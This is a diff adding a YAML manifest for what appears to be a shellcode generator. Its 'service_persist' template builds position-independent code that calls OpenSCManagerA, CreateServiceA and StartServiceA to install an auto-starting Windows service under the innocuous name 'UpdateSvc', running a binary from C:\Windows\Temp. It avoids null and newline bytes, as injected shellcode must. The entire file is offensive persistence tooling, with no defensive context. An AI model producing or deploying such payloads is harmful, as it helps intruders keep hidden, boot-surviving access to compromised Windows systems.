@@ -1,0 +1,34 @@
+template: service_persist
+# Install a Windows service that auto-starts on boot, then start it.
+#
+# Build:
+#   uv run emitter Tools/emitter/manifests/service_persist.yaml \
+#       --service-name "UpdateSvc" \
+#       --dst "C:\\Windows\\Temp\\svc.exe" \
+#       --out emitter_out/
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - LoadLibraryA
+  - OpenSCManagerA
+  - CreateServiceA
+  - StartServiceA
+  - CloseServiceHandle
+  - ExitProcess
+
+variables:
+  - scm_handle
+  - svc_handle
+
+strings:
+  - label: advapi32_dll
+    value: "advapi32.dll"
+    method: push
+  - label: service_name
+    value: "UpdateSvc"
+    method: mov
+    dest: edi
+  - label: dst_path
+    value: "C:\\Windows\\Temp\\svc.exe"
+    method: mov
+    dest: edi
